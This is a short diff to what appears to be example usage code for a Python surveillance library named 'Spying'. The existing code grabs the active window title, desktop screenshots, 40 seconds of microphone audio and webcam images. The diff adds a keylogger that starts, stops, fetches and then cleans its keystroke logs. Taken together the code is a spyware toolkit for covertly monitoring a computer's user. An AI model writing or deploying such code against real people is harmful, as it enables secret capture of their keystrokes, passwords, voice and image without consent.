@@ -6,6 +6,7 @@ import Spying.Clipboard
 import Spying.Desktop
 import Spying.Microphone
 import Spying.Webcam
+import Spying.Keylogger
 
 # Get active window title
 print("Current active window title is : " + Spying.ActiveWindow.Get())
@@ -23,4 +24,12 @@ Spying.Desktop.Screenshot(filename="image.jpg")
 Spying.Microphone.Record(filename="recording.wav", time=40)
 # Create webcam screenshot
 Spying.Webcam.Screenshot(filename="image.jpg", delay=4500, camera=1)
+
+# Keylogger
+logger = Spying.Keylogger.Logger()
+logger.Start()
+#time.sleep(10)
+logger.Stop()
+logger.FetchLogs()
+logger.CleanLogs()
 ```
